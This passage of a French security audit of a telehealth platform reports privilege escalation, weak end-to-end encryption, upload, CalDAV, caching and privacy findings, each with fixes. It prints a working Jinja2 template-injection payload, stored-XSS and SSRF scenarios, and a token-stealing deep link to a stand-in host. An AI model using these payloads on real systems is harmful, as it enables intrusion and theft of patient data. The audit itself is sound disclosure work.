- **Scénario** : un staff POSTe sa propre clé publique sur `generate-master/` avec `override=1` : toutes les consultations et files créées ensuite (ou réinitialisées via l'action `reset_encryption`) ont leur enveloppe de récupération chiffrée pour lui ; il lit les enveloppes dans l'admin et déchiffre les messages. Variante : `disable/` crée les nouvelles consultations en clair sans alerte ; `enable/`/`reprovision/` déclenchent des envois massifs de passphrases.
- **Impact** : contournement de la promesse E2E (« l'opérateur ne peut pas lire les messages », `docs/admin/encryption.md:23`) par un simple staff, sans trace.
- **Recommandation** : vérifier `request.user.is_superuser` (ou une permission dédiée) dans chaque vue custom ; journaliser et notifier tout changement de clé master ; exiger une confirmation forte avec empreinte pour `override` ; masquer clés et enveloppes pour les non-superusers.

### E-10 — Auto-élévation et prise de contrôle de comptes depuis l'admin (champs de privilège éditables, OTP et tokens affichés)

- **Localisation** : `backend/users/admin.py:216-241` (`is_staff`, `is_superuser` éditables), `:182` (`change_password_form` pour tout utilisateur), `:56-58` (`GroupAdmin` standard), `:187-189, 232-236` (`one_time_auth_token` et `verification_code` affichés en lecture seule à tout staff `view_user`), `:67-79` (`TokenAdmin` DRF avec `key` en `list_display`), `:626-632` (`DAVAppPasswordAdmin`, token en clair), `:60-61, 81-85` (`SocialApp`/`SocialToken` bruts) ; `backend/messaging/admin.py:148-150, 197-204` (`access_link`, `link_token`, `link_target` affichés), `:157-179` (`Message` créable avec `sent_to` arbitraire, `messaging/models.py:866-905` : la propriété `access_link` **minte** un `one_time_auth_token` s'il manque), `:267-286` (rendu des templates `your_authentication_code` avec l'OTP courant) ; `backend/api/views.py:67-200` (`one_time_auth_token` = JWT).
- **Description** : comportement Django par défaut non durci, plus exposition de secrets vivants.
- **Scénario** : (a) un staff avec `change_user` coche `is_superuser` sur son compte ou change le mot de passe d'un superuser ; (b) un staff `view_user` lit l'OTP ou le `one_time_auth_token` d'un patient et obtient un JWT via `/api/auth/token/` ; (c) un staff `add_message` crée un `Message` vers une victime : le champ `access_link` lui affiche `?auth=<token frais>` ; (d) `add_tokenproxy` crée un token API pour un praticien ; (e) `add_davapppassword` crée un mot de passe CardDAV pour un praticien et exporte le carnet patients.
- **Recommandation** : `get_readonly_fields` rendant `is_superuser`, `is_staff`, `groups`, `user_permissions` non éditables pour les non-superusers ; interdire l'édition d'un superuser et le changement de mot de passe d'autrui par un non-superuser ; `GroupAdmin` réservé aux superusers ; ne jamais afficher `verification_code`, `one_time_auth_token`, `access_link`, `link_target`, `task_logs` (indicateur « défini/expiré » seulement) ; hacher OTP et tokens ; retirer `TokenProxy`/`DAVAppPassword`/`SocialToken` de l'admin ou les réserver aux superusers avec affichage unique ; `MessageAdmin` en lecture seule.

### E-11 — Exécution de code (SSTI) via les templates de notification Jinja2 non sandboxés

- **Localisation** : `backend/messaging/models.py:1208-1226` (`jinja2.Environment(...)` standard, `env.filters.update(register.filters)`, `env.from_string(template_str).render({"obj": <instance ORM>, "config": <constance>, ...})`), `:392-414` (`Template.clean` : `env.parse` seulement, `template_content_html` jamais validé), `:453-464`, `backend/messaging/whatsapp_content.py:329-343` ; `backend/messaging/admin.py:292-307` (`TemplateAdmin` = `ImportExportModelAdmin`, import ouvert à tout staff, voir C-04).
- **Description** : sujets et corps sont des templates Jinja2 lus dans `messaging.Template` (override admin) et rendus avec un environnement **non sandboxé**, avec des instances ORM et la config Constance dans le contexte. `{{ obj.__class__.__init__.__globals__['os'].popen('id').read() }}` s'exécute sur le worker Celery et sur le web. Point positif vérifié : les valeurs utilisateur (prénom, contenu de chat, motif) sont interpolées comme valeurs et jamais re-parsées, donc pas de SSTI depuis un patient ou un praticien.
- **Scénario** : un staff éditeur de templates (ou tout staff via l'import CSV) modifie `reminder` ; au prochain rappel le worker exécute du code : lecture de l'environnement (DB, S3, VAPID, Twilio), accès aux données de tous les tenants.
- **Impact** : RCE, escalade staff → système.
- **Recommandation** : `jinja2.sandbox.ImmutableSandboxedEnvironment`, contexte restreint (objets « vue » plutôt qu'instances ORM, retirer `config`), ne pas enregistrer tous les filtres Django, réserver édition et import des templates aux superusers, journaliser les modifications, valider aussi `template_content_html`.

### E-12 — XSS stocké dans l'admin et HTML libre dans les emails (templates, pied de page d'organisation)

- **Localisation** : `backend/messaging/admin.py:281-286` (`mark_safe(instance.render_content_html)`), `backend/messaging/models.py:1235-1237` (`render` renvoie `content_html` brut si `template_system_name` est vide), `messaging/templates/messaging/email_base.html:179, 191` (`{{ content|safe }}`, `{{ organisation.footer_patient|safe }}`), `backend/users/admin.py:600-604` (`OrganisationAdmin` avec widget Trix sans assainissement serveur).
- **Scénario** : un staff `add_message` crée un `Message` sans template avec `content_html=<script>…` ; tout admin (superuser inclus) ouvrant la fiche exécute le script (jeton CSRF dans le DOM, POST vers `/admin/users/user/<id>/change/` pour se promouvoir). Le même HTML part dans les emails à tous les patients (hameçonnage depuis l'expéditeur légitime) ; `footer_patient` idem pour un staff `change_organisation`.
- **Recommandation** : supprimer `mark_safe` (aperçu dans un `<iframe sandbox srcdoc>` ou en texte) ; assainir le HTML des templates, footers et CGU côté serveur (nh3/bleach, liste blanche) ; CSP stricte sur l'admin ; réserver `Template` et `Organisation` aux superusers.

### E-13 — Un patient énumère les données personnelles de tous les utilisateurs et désigne n'importe quel compte comme « médecin » (`expected_with_id`)

- **Localisation** : `backend/consultations/serializers.py:1516-1543, 1609-1616` (`User.objects.get(id=expected_with_id)` sans filtre, réponse via `ConsultationUserSerializer` avec email, `mobile_phone_number`, `temporary`, `public_key`), `backend/consultations/views.py:1447-1463` (`RequestViewSet`, `IsAuthenticated`), `backend/consultations/assignments/appointment.py:58-61` (aucune vérification que `expected_with` est praticien).
- **Scénario** : `POST /api/requests/ {"reason_id": <active>, "expected_with_id": N}` pour N = 1… : email, téléphone et nom de chaque utilisateur (patients inclus) dans la réponse ; la demande peut aboutir à un rendez-vous « possédé » par un non-praticien.
- **Recommandation** : restreindre `expected_with_id` aux praticiens de la spécialité de la raison (visibles ou publics) ; ne renvoyer qu'un sous-ensemble public.

### E-14 — Écritures de rendez-vous hors périmètre : `destroy`, `send`, `leave` avec le périmètre de lecture élargi ; CalDAV réécrit/annule par tout participant

- **Localisation** : `backend/consultations/views.py:582-583` (`WRITE_ACTIONS` sans `destroy`, `send`, `leave`), `:605-618` (périmètre de lecture = rendez-vous de **tous** les praticiens visibles, `users_visibility = all` par défaut), `backend/fhir_server/mixins.py:165-178` (`destroy` = `soft_delete` → `status=cancelled`), `consultations/urls.py:36-45` (DELETE conditionnel sur la collection) ; `backend/caldav/views.py:397-455` (`_put`), `:457-472` (`_delete`), `:474-530` (`_sync_participants` : ajout de tout utilisateur actif par email, désactivation des absents dont l'organisateur), `:532-558` (`_find_appointment` : `participant__user=user` seulement) ; `backend/users/views.py:2394-2402` (`DAVAppPasswordViewSet` ouvert aux patients).
- **Scénario** : `DELETE /api/appointments/<id_rdv_confrere>/` ou `DELETE /api/fhir/Appointment?identifier=…` annule le rendez-vous et notifie les participants ; `POST /api/appointments/<id>/send/` envoie les invitations d'un brouillon d'autrui. Via CalDAV, un patient (`PUT /dav/calendar/appointment-123@….ics` avec Basic app password) replanifie, évince le praticien de la liste `ATTENDEE`, invite un tiers, ou annule (`DELETE`) ; les notifications partent au nom du créateur.
- **Recommandation** : ajouter `destroy`, `send`, `leave` au périmètre write/roster ; restreindre PUT/DELETE CalDAV au créateur ou à `accessible_by` (patients : seulement leur `PARTSTAT`) ; ne pas créer de rendez-vous depuis CalDAV pour un non-praticien ; envisager de réserver les app passwords aux praticiens.

### E-15 — Uploads : antivirus jamais exécuté via l'API, aucune validation de type, écrasement de fichiers sur S3

- **Localisation** : `backend/consultations/models.py:509-515` (validateur `validate_file_infection` sur le champ modèle), `backend/consultations/serializers.py:1336` (`attachment = serializers.FileField(...)` redéclaré : les validateurs du modèle ne sont pas repris ; aucun `full_clean()` dans le backend), `:1353-1364` (seule validation : taille), `backend/core/settings.py:71-80` (`CLAMD_ENABLED = False` si non configuré), django-clamd `CLAMD_FAIL_BY_DEFAULT = False` ; `backend/users/serializers.py:97-101` (`picture` sans limite de taille) ; `backend/core/storage.py` (`TenantUploadTo` conserve le nom d'origine) + `STORAGES` S3 sans `file_overwrite: False` (défaut `True` dans django-storages 1.14).
- **Description** : `.exe`, `.html`, `.svg`, `.js` sont acceptés tels quels ; même appelé, ClamAV serait un no-op sans clamd, et un fichier trop gros passe (fail-open) ; si clamd est configuré mais injoignable, `clamd.ConnectionError` n'est pas capturée (500). Sur S3, deux uploads du même nom dans un tenant (`IMG_0001.jpg`, `scan.pdf`) écrasent silencieusement l'objet précédent : le message du patient A pointe désormais vers le fichier du patient B.
- **Impact** : distribution de malwares entre patients et soignants (l'antivirus documenté n'apporte rien) ; fuite croisée et corruption de documents de santé entre consultations.
- **Recommandation** : appeler `validate_file_infection` dans `validate_attachment` (et pour `picture`), `CLAMD_FAIL_BY_DEFAULT = True`, capturer `ConnectionError` en fail-close ; liste blanche d'extensions + magic bytes + cohérence content-type ; `"file_overwrite": False` et, mieux, nom de fichier UUID (nom d'origine en base) ; appliquer `max_upload_size_mb` aux avatars et `Image.MAX_IMAGE_PIXELS`.

### E-16 — Export PDF : contenu utilisateur passé brut au mini-langage XML de ReportLab

- **Localisation** : `backend/consultations/pdf_export.py:256, 272, 280, 293, 323, 431, 435, 478, 487, 496` (`Paragraph(msg.content)`, `Paragraph(consultation.description)`, valeurs de custom fields, titres de rappels, nom de fichier de pièce jointe, footer) ; endpoint `consultations/views.py:509-555`.
- **Description** : vérifié à l'exécution avec reportlab 5.0.1 : `<b>` non fermé lève `ValueError` (500) ; `<img src='/chemin/absolu.png'/>` embarque l'image locale dans le PDF ; les URL distantes sont refusées (pas de SSRF).
- **Scénario** : un patient poste `<b>` : l'export PDF de la consultation renvoie 500 définitivement. Un praticien insère `<img src="/var/lib/hcw/uploads/<autre_schema>/messages_attachment/radio.jpg"/>` dans un message et exporte : lecture d'une image médicale d'un autre tenant (stockage local, noms conservés).
- **Recommandation** : `xml.sax.saxutils.escape()` sur chaque valeur avant `Paragraph()` via un helper unique ; `rl_config.trustedSchemes = []`.

### E-17 — Enregistrement vidéo et transcription sans information ni consentement du patient

- **Localisation** : `backend/consultations/views.py:881-949` (`start_recording` : aucun événement WebSocket, aucune trace de consentement), egress room-composite = participant caché LiveKit ; `patient/src/app` : aucune occurrence de `recording`/`transcription` hors flags de config ; `practitioner/src/app/core/services/transcription.service.ts:60-75` (`startRemote` capte l'audio des **autres** participants) ; `backend/consultations/consumers.py:65-71, 114-137, 470-502` (transcription lancée par tout participant, transcript persisté dans `Appointment.transcript`, en clair, hors E2E, sans endpoint de suppression).
- **Impact** : traitement de la voix et de l'image du patient sans base légale documentée ni possibilité de s'y opposer (`recording_available` n'est qu'un message de chat a posteriori). Risque RGPD/LPD et pénal (enregistrement à l'insu).
- **Recommandation** : événements `recording_started/stopped` et `transcription_started` diffusés à tous les participants, bandeau permanent côté patient, consentement explicite horodaté par participant (`AppointmentRecording.consented_by/at`), possibilité de refus, rétention des transcriptions.

### E-18 — Le chiffrement « de bout en bout » ne résiste pas à un serveur malveillant ou compromis (distribution des clés sans vérification, downgrade)

- **Localisation** : `practitioner/src/app/modules/user/components/create-consultation-modal/create-consultation-modal.ts:385-460`, `consultation-form.ts:635-725` (clé master prise dans `/config`), `practitioner/src/app/core/services/consultation-crypto.service.ts:101-147` (`participant.user.public_key` pris du serveur, `public_key_fingerprint` seulement recopié), `consultation-detail.ts:742-791, 1072-1135`, `patient/src/app/pages/home/home.page.ts:926-960`, `video-consultation.page.ts:713-754` ; `backend/users/views.py:1670-1672` (`master_public_key` servie sans authentification) ; aucune empreinte affichée ni comparée dans les templates HTML des deux frontends (`EncryptionStorageService.getFingerprint` sans appelant) ; `backend/consultations/serializers.py:407-440, 552-582` (`is_encrypted`, `public_key`, `encrypted_private_key_master`, `initial_keys` modifiables en PATCH), `backend/consultations/views.py:225-297` (`sync_consultation_keys` : `update_or_create` écrase les enveloppes existantes, aucune vérification de l'enveloppe).
- **Description** : le dispositif est un chiffrement d'enveloppe côté client dont **toutes** les clés publiques (master, queues, participants, consultation) et le drapeau `is_encrypted` sont fournis par le serveur et suivis aveuglément. Il protège contre une fuite passive de la base (dump, sauvegarde) mais pas contre un opérateur, un attaquant en écriture DB/API ou un backend compromis, qui peut substituer une clé publique, basculer `is_encrypted=false` (le client envoie alors en clair sans avertissement) ou écraser des enveloppes. Le périmètre chiffré se limite au chat : titres, descriptions, notes cliniques, participants, rendez-vous, enregistrements et transcriptions restent en clair. La documentation (« There is no backdoor », « an operator with database access cannot read the messages », `docs/admin/encryption.md:23, 59`) et le README (« End-to-end messaging ») surestiment la garantie.
- **Recommandation** : documenter honnêtement le modèle (« chiffrement côté client résistant à une fuite de base, non à un serveur malveillant ») ; TOFU avec affichage et comparaison d'empreintes (master, queues, correspondants) et alerte en cas de changement ; signature des clés publiques utilisateurs par la clé master hors ligne ; épingler côté client `is_encrypted`/`public_key` d'une consultation déjà vue et refuser tout downgrade silencieux ; champs de chiffrement en lecture seule après création ; `sync-consultation-keys` ne créant que les enveloppes manquantes, avec contrôle de cohérence `pubkey_fingerprint`.

### E-19 — Provisioning E2E côté serveur : clés privées générées par le serveur, passphrases envoyées en clair par des prestataires tiers, jamais forcées au changement

- **Localisation** : `backend/encryption_admin/tasks.py:195-224` (`_provision_user_keypair`), `:153-192` (`_email_passphrase` → email, SMS, WhatsApp, push ou praticien créateur), `:227-262` (clé privée de queue en clair enveloppée pour chaque membre) ; `backend/messaging/template.py:175-218` (passphrase en clair dans le corps, variante praticien avec identité du patient) ; providers SMS `twilio_sms.py:59`, `ovh.py:79`, `swisscom.py:83`, `clickatel.py:54`, `smsmode.py:48`, `twilio_whatsapp.py` ; `backend/core/encryption.py:153-243` (paire de consultation générée côté serveur pour les flux Request, rendez-vous temporaires et FHIR) ; `backend/users/encryption_views.py:116-131` (`forgot-passphrase` sans ré-authentification, sans throttle) ; `activate-encryption.ts:73-97`, `activate-encryption.page.ts:56-84` (aucun changement de passphrase imposé) ; `user-profile.ts:271-283`, `profile.page.ts:340-345` (aucune règle de robustesse pour une passphrase choisie).
- **Description** : le serveur génère la clé privée RSA de chaque utilisateur et de chaque queue, choisit la passphrase et l'expédie par SMTP, Twilio (États-Unis), Meta, OVH, Swisscom, Clickatell ou SMSMode. Le client n'impose jamais de changement. Quiconque cumule la boîte mail ou les journaux du prestataire SMS et une lecture de la base (`encrypted_private_key`) déchiffre toutes les consultations de l'utilisateur ; un worker Celery compromis voit des clés privées en clair ; un simple vol de session vaut réinitialisation de clé via `forgot-passphrase`.
- **Recommandation** : générer les paires utilisateur dans le navigateur au premier login (passphrase choisie localement, blob envoyé chiffré) ; pour le legacy, forcer le changement à l'activation et invalider la passphrase initiale ; ne jamais remettre une passphrase par SMS/WhatsApp ; ré-authentification, throttle, journal et notification sur `forgot-passphrase` et `update-encrypted-private-key` ; longueur minimale et estimation d'entropie (zxcvbn) pour les passphrases choisies ; différer la génération serveur de la paire de consultation au premier client praticien.

### E-20 — Service worker praticien : réponses `/api/**` (données de santé) mises en cache sur disque, sans purge au logout

- **Localisation** : `practitioner/ngsw-config.json:32-56` (`api-cache` : `*/api/**` freshness 1 h, 100 entrées ; `api-performance` : `*/api/auth/user/`, `*/api/appointments/**`, `*/api/patients/**`, `*/api/practitioners/**` en stratégie **performance** 30 min), `practitioner/src/app/app.config.ts:186-189` (SW activé hors dev), `practitioner/src/app/core/components/header/header.ts:386-406` (logout : `localStorage.clear()` sans purge du Cache Storage), `practitioner/src/app/core/services/offline.service.ts:102-107` (`clearAllCaches()` jamais appelé) ; le backend n'émet pas de `Vary: Authorization`.
- **Scénario** : poste partagé en cabinet : A se déconnecte, B se connecte ; `GET /api/auth/user/` et `/api/patients/12/` sont servis depuis le cache de A pendant 30 min ; dossiers patients consultables hors ligne dans le Cache Storage par quiconque accède au profil navigateur ; données périmées affichées.
- **Recommandation** : supprimer les `dataGroups` API (ou les limiter à `/api/config/`, `/api/languages/`) ; appeler `clearAllCaches()` et purger IndexedDB au logout et sur 401 ; si un cache API doit exister, `freshness` seulement avec `maxAge` court et purge à chaque changement de session.

### E-21 — Application patient : fuite des JWT (access et refresh) vers une autre instance lors d'un changement d'instance

- **Localisation** : `patient/src/app/core/services/deeplink.service.ts:150-186` (`handleUrl` : `localStorage.setItem(API_ORIGIN_KEY, origin)` sans purge de session), `:113-130` ; `patient/src/app/core/interceptors/auth.interceptor.ts:31-34` (toute URL relative est rebasée sur l'origine stockée), `:43-47` (`Authorization: Bearer` ajouté à toute requête sans contrôle d'hôte), `:61-105` (401 `token_not_valid` → `refreshToken()` → POST du refresh sur la même origine) ; `login.page.ts:81-83` (`changeServer()` sans logout, contrairement à `profile.page.ts:225-231`).
- **Scénario** : un opérateur d'instance certifiée malveillant (ou une instance certifiée compromise) diffuse `hcw://evil.certified.example/home`. La victime, connectée à son instance A, ouvre le lien : la signature de B est valide, l'app bascule, B reçoit l'access token de A puis, sur le 401 que B renvoie naturellement, le **refresh token** de A. B rejoue ces jetons contre A.
- **Impact** : compromission de session inter-instances ; la certification atteste qu'un hôte est une instance HCW, pas qu'il peut recevoir les secrets des autres.
- **Recommandation** : purger session, clés locales et WebSocket avant tout changement de `hcw_api_origin` ; stocker les jetons sous une clé préfixée par l'origine et n'attacher `Authorization` que si `new URL(request.url).origin === origineActive` ; ne jamais tenter un refresh vers une autre origine ; demander confirmation avant de basculer depuis un deep link quand une session est ouverte ; n'activer le mécanisme d'origine que sur plateforme native.

### E-22 — Capacitor : `allowNavigation: ['*']` et `cleartext: true` exposent le pont natif à toute origine

- **Localisation** : `patient/capacitor.config.ts:7-11` ; manifeste généré `patient/android/capacitor-cordova-android-plugins/src/main/AndroidManifest.xml:4` (`usesCleartextTraffic="true"`) ; aucun `network_security_config` ; Capacitor 7.6.8 : `Bridge.java:236-255` (`'*'` → règle d'origine `https://*`), `MessageHandler.java:26-36` (`addWebMessageListener("androidBridge", allowedOriginRules)`), `Bridge.java:411-423` (hôte autorisé chargé dans la WebView au lieu du navigateur), iOS `JSExport.swift:20-21` (pont injecté dans toute page main-frame).
- **Description** : sur Android, `window.androidBridge` est injecté dans **toute page https** chargée en main-frame ; un script tiers peut invoquer les plugins natifs (`CapacitorHttp.request` sans CORS, y compris vers le réseau local ; `CapacitorCookies` ; `WebView.persistServerBasePath` ; `App.exitApp`). Sur iOS le pont complet est injecté dans toute page. Toute navigation http(s) reste dans la WebView sans barre d'adresse (phishing plein écran sous l'identité de l'app) et `cleartext` autorise le HTTP en clair. Vecteurs constatés : lien `target="_blank"` de `untrusted-instance.page.html:17`, lien d'attribution Leaflet (`search-map.component.ts:85`), HTML d'administration rendu par `[innerHTML]` (CGU, footer, branding, notifications). Aucun besoin fonctionnel : les appels API passent par XHR.
- **Recommandation** : supprimer `allowNavigation` et `cleartext` (au moins en release, config par environnement) ; `network_security_config` interdisant le clair ; ouvrir les liens externes via `@capacitor/browser` ; `attributionControl: false` ; ne pas rendre de liens cliquables dans le HTML tenant côté natif.

### E-23 — Paquet Debian : `.env-dist` installé tel quel comme configuration de production

- **Localisation** : `backend/Makefile:21` (`cp .env-dist $(DESTDIR)/etc/hcw/backend.conf`), `backend/.env-dist:2` (`DJANGOSECRET_KEY` commitée depuis le commit `0dc1eecb`, 2025-08-20), `:7-8` (`CSRF_TRUSTED_ORIGINS=http://…`, `DEBUG=True`), `:21` (`DATABASE_PASSWORD=hcw`), `:35` (`ENCRYPTION_KEY` commitée) ; `debian/service:8-11` ; `debian/postinst:22-26` (aucun `chmod`) ; `docs/deployment/debian.md:34-37` recommande le mot de passe DB `hcw`.
- **Description** : l'installation du `.deb` démarre le service avec `DEBUG=True` et une clé publique tant que l'opérateur n'a pas édité `/etc/hcw/backend.conf`. En `DEBUG=True` : reflet de toute origine CORS avec credentials, traceback dans les réponses API, pages de debug Django, cache LocMem (throttling par processus), SQL en DEBUG dans les journaux. Le fichier est vraisemblablement installé en 0644 (à confirmer sur un paquet construit).
- **Recommandation** : livrer un `backend.conf` sans secrets et `DEBUG=False`, générer la clé dans `postinst`, `chmod 640 root:hcw`, refuser de démarrer si la clé vaut celle de `.env-dist`, corriger la documentation, ajouter un guide de durcissement.

### E-24 — Aucune piste d'audit des accès aux données de santé

- **Localisation** : `backend/core/settings.py:1565-1595` (`LOGGING` : console uniquement, root `INFO`, `DEBUG` si `DEBUG`) ; `:96` (`unfold.contrib.simple_history` déclaré mais `simple_history` absent de `INSTALLED_APPS` et de `requirements.txt`) ; aucun hook `user_login_failed`, aucun modèle d'audit ; `core/views.py:30-42`, `users/views.py:1686-1719`, `api/views.py:67-200` (aucun log de succès/échec d'authentification) ; lectures de consultations, exports PDF, téléchargements de pièces jointes et d'enregistrements non tracés ; changements de clé master, de Constance, de templates, imports/exports sans trace exploitable (seul `django.contrib.admin.LogEntry` couvre le CRUD admin standard).
- **Impact** : impossible de répondre à « qui a consulté quel dossier, quand » ; non-conformité RGPD art. 32, LPD, exigences HDS de traçabilité ; enquête après incident impossible.
- **Recommandation** : journal d'audit applicatif dédié (table append-only, `django-auditlog` ou `simple_history`) couvrant login/échec/reset, lecture/export/téléchargement de consultation, changements admin sensibles, impersonation ; export vers un collecteur central (syslog/SIEM) avec rétention et protection ; `django-axes` pour les échecs.

### E-25 — Effacement non effectif : fichiers orphelins, enregistrements jamais supprimés, aucune procédure d'effacement ni d'anonymisation

- **Localisation** : `backend/consultations/views.py:1905-1908` (soft delete : `attachment = None` sans suppression du fichier), `:1867-1888` (PATCH ne supprime pas l'ancien fichier) ; `backend/consultations/tasks.py:322-364` (`auto_delete_closed_consultations` : `qs.delete()`, cascade DB seulement) ; `backend/consultations/signals.py:182-193` (`post_delete` = notification WS uniquement) ; aucun `storage.delete`/`delete_object` dans le backend (`AppointmentRecording.filepath`, `Message.recording_url`) ; `tasks.py:225-295` (un enregistrement jamais stoppé reste sur S3 sans ligne `Message`) ; `consultations/models.py:116-122` (`Consultation.beneficiary` en `PROTECT`) ; `messaging/models.py:735-738, 767-773` (`recipient_phone/email` conservés après suppression du compte) ; `users/models.py:461-466, 486-488` (`HealthMetric` orphelines) ; aucune anonymisation ; aucun endpoint d'export ou d'effacement pour la personne concernée ; `consultation_auto_delete_hours = 0` par défaut.
- **Impact** : pièces jointes médicales, enregistrements vidéo et transcriptions de consultations « supprimées » conservés indéfiniment ; droit à l'effacement (art. 17) non exécutable de bout en bout.
- **Recommandation** : `pre_delete`/`post_delete` sur `Message` et `AppointmentRecording` supprimant fichier et objet S3 (aussi sur soft delete) ; arrêt automatique de l'enregistrement à la fermeture de la room ; procédure d'effacement/anonymisation d'un patient (identifiants, `messaging.Message`, `HealthMetric`, `TaskResult`) ; politique de rétention par défaut non nulle et documentée ; endpoints d'export et d'effacement (art. 15/17/20).

### E-26 — Adresses postales de tous les utilisateurs (patients inclus) envoyées au Nominatim public d'OpenStreetMap et journalisées

- **Localisation** : `backend/users/signals.py:10-34` (`post_save` sur **tous** les `User` et `Organisation` dès que `city` est renseigné, sans filtre `is_practitioner`) → `backend/users/tasks.py:140-151` (`street, postal_code, city, country` en `GET` vers `nominatim_url()`), défaut `https://nominatim.openstreetmap.org/search` (`core/settings.py:455-458`) ; `users/tasks.py:153, 168, 172` et `management/commands/geocode.py:144, 158, 162, 167` (adresse complète dans les journaux).
- **Impact** : l'adresse du domicile de chaque patient est transmise à un tiers hors contrat (OSMF, pas de DPA) avec l'IP de l'établissement, à chaque sauvegarde touchant l'adresse, puis dans les logs ; seuls praticiens et organisations sont affichés sur la carte.
- **Recommandation** : limiter le signal aux praticiens et organisations (ou opt-in), instance Nominatim privée obligatoire en production, ne pas journaliser l'adresse (identifiant seulement), inscrire le traitement au registre.

### E-27 — SMS pumping et bombardement de codes ; filtrage de préfixes ignoré hors WhatsApp

- **Localisation** : `backend/users/views.py:1775-1815` (`RegisterView`), `:1989-2020` (`VerificationResendView`), `:2223-2313` (`SendVerificationCodeView`), `backend/api/views.py:222-240` (`AnonymousTokenAuthView` renvoie un nouveau code à chaque requête sans `verification_code`) ; `backend/users/validators.py:14-54` (tout numéro `is_possible_number`, y compris internationaux et surtaxés) ; `backend/messaging/models.py:121-156` (`matches_phone_prefix`, appelé uniquement par `twilio_whatsapp.py:131`, absent de tous les providers SMS et du dispatcher `messaging/tasks.py:27-72`, y compris le repli WhatsApp → SMS) ; rappels récurrents (`Reminder`) vers tout numéro par tout praticien.
- **Description** : chaque appel déclenche un message facturé ; rien ne limite le nombre de destinataires distincts ni le coût par destination hors throttles IP (contournables, E-01). `included_prefixes`/`excluded_prefixes` n'ont d'effet que sur WhatsApp.
- **Impact** : coût financier direct (numéros surtaxés détenus par l'attaquant), harcèlement d'une victime, épuisement du quota du prestataire et indisponibilité des vrais codes de connexion.
- **Recommandation** : quotas globaux par tenant/heure et par destinataire indépendants de l'IP, CAPTCHA ou proof-of-work sur inscription et resend, liste de pays autorisés (`phonenumbers.region_code_for_number`), refus des numéros premium, appliquer `matches_phone_prefix` à tous les canaux dans `_send_with_channel`, alerte sur pic d'envois.

---

## 5. Constats de sévérité moyenne

### M-01 — Sessions Django partagées entre tenants avec des identifiants utilisateurs qui se recouvrent
- **Localisation** : `backend/core/settings.py:101` (`django.contrib.sessions` en `SHARED_APPS`) vs `:131` (`users` en `TENANT_APPS`) ; aucun `SESSION_COOKIE_DOMAIN`/`SESSION_ENGINE` défini.
- **Description** : la table `django_session` vit dans le schéma `public`, alors que les `User` sont par schéma avec des clés primaires qui se recouvrent. Un `sessionid` créé sur le tenant A avec `_auth_user_id=5`, présenté sur le domaine du tenant B, authentifie l'utilisateur 5 de B (admin, allauth). Exploitable si les domaines partagent un cookie ou par transfert du cookie (à confirmer selon le DNS).
- **Recommandation** : cloisonner les sessions par tenant (backend cache tenant-aware ou préfixe schéma), domaines de cookies disjoints, `SESSION_COOKIE_SECURE`.

### M-02 — Transcription en direct diffusée à des utilisateurs absents de l'appel
- **Localisation** : `backend/consultations/consumers.py:367-370, 534-540` → `consultations/signals.py:32-69` (`get_users_to_notification_consultation` inclut owner, créateur, bénéficiaire et **tous les membres de la queue**).
- **Description** : la retranscription de la voix est poussée à tous les praticiens de la file, pas seulement aux participants actifs de l'appel.
- **Recommandation** : restreindre la diffusion aux participants actifs (`is_active` du roster).

### M-03 — Restauration du statut « en ligne » sans `schema_name`
- **Localisation** : `backend/users/consumers.py:291-296` (`set_user_online(self.user_id)` sans `self.schema_name`, contrairement aux autres appels) → `users/services.py:22, 49-52` (repli sur `connection.tenant`, interdit dans le thread async partagé selon `channelsmiddleware.py:45-54`).
- **Description** : le flag peut s'écrire sous le mauvais schéma (présence inter-tenant incohérente).
- **Recommandation** : `set_user_online(self.user_id, self.schema_name)`.

### M-04 — Endpoint Web Push fourni par l'utilisateur : SSRF semi-aveugle et blocage du worker
- **Localisation** : `backend/users/models.py:133` (`endpoint = URLField` sans restriction), `users/views.py:973-983`, `backend/messaging/providers/webpush.py:57-62` (`webpush(...)` sans `timeout`), `messaging/tasks.py:47-66` (statut `sent`/`failed` exposé via `/api/user/notifications/`).
- **Description** : tout utilisateur enregistre un endpoint interne (`http://169.254.169.254/…`, LiveKit 7880, whisper 9090, MinIO), passe son canal à `push` et déclenche une notification : le worker POSTe, et le statut renseigne sur la joignabilité ; un endpoint muet bloque le worker sans limite (à confirmer sur pywebpush 2.4.0).
- **Recommandation** : n'accepter que `https://` vers les services de push connus (ou refuser IP privées après résolution DNS), `timeout=10`, ne pas exposer le statut d'envoi.

### M-05 — Secrets de prestataires, de serveurs média, TURN et SSO en clair en base et dans l'admin
- **Localisation** : `backend/messaging/models.py:60-83` (`api_key`, `auth_token`, `client_secret`, `application_secret`, `consumer_key` en `CharField`), `messaging/admin.py:47-67` (champs texte), `mediaserver/models.py:41-47, 199-201` (`api_token`, `api_secret`, `Turn.credential`), `users/admin.py:60-61, 81-85` (`SocialApp`/`SocialToken` bruts), `core/settings.py:545` (`ENCRYPTION_KEY` lue, jamais utilisée), `core/fields.py:1-41` (`EncryptedField` : imports manquants, `self.instance` inexistant, jamais référencé).
- **Description** : un staff `view_messagingprovider` lit l'`auth_token` Twilio (lecture des SMS envoyés côté Twilio, forge de callbacks) ; un dump SQL contient toutes les credentials. Point positif : `Server.api_secret` est masqué dans l'admin.
- **Recommandation** : chiffrement applicatif (Fernet) des champs secrets, widgets `PasswordInput` « laisser vide pour conserver », accès superuser ; supprimer `ENCRYPTION_KEY` et `core/fields.py`.

### M-06 — Réponses des prestataires SMS persistées en base, purge cassée, journaux avec numéros et adresses
- **Localisation** : `task_logs += response.text` dans `twilio_sms.py:71-73`, `ovh.py:110-112`, `swisscom.py:90-92`, `clickatel.py:62-64`, `smsmode.py:58-60`, `twilio_whatsapp.py:218-223` (la ressource Twilio contient `body` : OTP, lien `?auth=`, contenu de chat, à confirmer) ; affiché dans `messaging/admin.py:143, 216-220` ; `messaging/tasks.py:139-156` (`cleanup_old_message_logs` met à jour `task_traceback`, champ supprimé par la migration 0015 → `FieldDoesNotExist`, et non planifiée dans `CELERY_BEAT_SCHEDULE`) ; téléphones en INFO dans tous les providers, adresses dans `users/tasks.py:153, 168, 172`, sujet d'email en DEBUG `email.py:72`.
- **Recommandation** : ne journaliser que statut et identifiant du prestataire ; corriger et planifier la purge (30/90 jours) ; masquer numéros et adresses dans les logs.

### M-07 — Contenu médical dans les notifications sortantes (SMS, WhatsApp, push, email)
